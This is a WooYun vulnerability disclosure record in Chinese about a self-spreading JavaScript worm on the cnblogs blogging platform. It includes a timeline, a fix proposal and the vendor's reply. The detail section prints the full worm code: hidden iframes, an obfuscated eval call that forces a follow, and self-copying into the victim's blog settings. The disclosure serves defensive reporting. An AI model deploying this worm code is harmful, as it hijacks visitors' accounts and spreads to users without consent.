{"id": 15301, "wybug_id": "wooyun-2012-014660", "wybug_title": "博客园javascript蠕虫入侵", "wybug_corp": "博客园", "wybug_author": "Darrel.Hsu", "wybug_date": "2012-11-21 15:32", "wybug_open_date": "2013-01-05 15:32", "wybug_type": "成功的入侵事件", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-05：\t细节向公众公开  简要描述： 博客园允许博主自定义javascript，但对其安全性较验太弱。用户可能被感染javascript蠕虫，严重时可能会导致用户数据被清除。 详细说明：  用户内容管理后台地址固定且无二次密码较验，攻击者可以通过javascript创建一个iframe取到用户名信息，然后拼出后台地址。后台地址无二次密码较验，而且在同域。攻击者可以通过javascript拿到后台相关数据或操作相关数据。比如：删除访问者博主的所有数据。攻击者同样可以利用JS修改设置页内容，复制蠕虫脚本至设置项并更新，使访问者受感染。\nfunction hack(){var id = \"D_Hacker\" + parseInt( Math.random() * 1000 );function createIframe( src , cb ){  var iframe ;  if( ! ( iframe =  document.getElementById( id ) ) ){    iframe = document.createElement(\"iframe\")    iframe.style.display=\"none\";    iframe.id = id ;    document.body.appendChild(iframe);  }  iframe.onload = function(){ cb( iframe ) } ;   if( src.indexOf(\"http\") == 0 ){    iframe.src = src ;  }else{    var doc = iframe.contentWindow.document;    doc.open();    doc.write( src );    doc.close();  }}var m = [\"c\", \"n\", \"b\", \"l\", \"o\", \"g\", \"s\", \".\", \"U\", \"s\", \"e\", \"r\", \"M\", \"a\", \"n\", \"a\", \"g\", \"e\", \"r\", \".\", \"F\", \"o\", \"l\", \"l\", \"o\", \"w\", \"B\", \"l\", \"o\", \"g\", \"g\", \"e\", \"r\"]m = m.join(\"\")window.eval( m + '(\"b8a15066-1039-e011-ac81-842b2b196315\")')createIframe(\"http://www.cnblogs.com/\",function( iframe ){  var win = iframe.contentWindow;  var href = $(\"#span_userinfo a:eq(1)\", win.document );  href = href.attr(\"href\") + \"admin/Configure.aspx\";  createIframe( href , function( iframe ){    var doc = iframe.contentWindow.document;    var val = $(\"#Edit_txbPageEndHtml\",doc).val() || \"\";     if( val.indexOf(\"b8a15066()\") < 0 ){      val = val +  \"<scri\"+\"pt>\"+ hack.toString() +\";hack();</scr\" +\"ipt>\";      $(\"#Edit_txbPageEndHtml\",doc).val( val );      $(\"#Edit_lkbPost\" , doc ).trigger(\"click\");    }  });})};hack();\n   漏洞证明：  用Chrome浏览器在登录状态下访问博客：http://www.cnblogs.com/darrel   修复方案：  用户用台采用单独子域并二次密码较验。同时在关系设置内容上增加验证码。   版权声明：转载请注明来源 Darrel.Hsu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2012-11-24 09:01 厂商回复： 目前只对部分用户开通脚本权限 最新状态： 2013-10-30：我们正在进一步处理该漏洞  ", "replys": "漏洞评价：\n评论\n     2012-11-24 17:56 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  大神。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}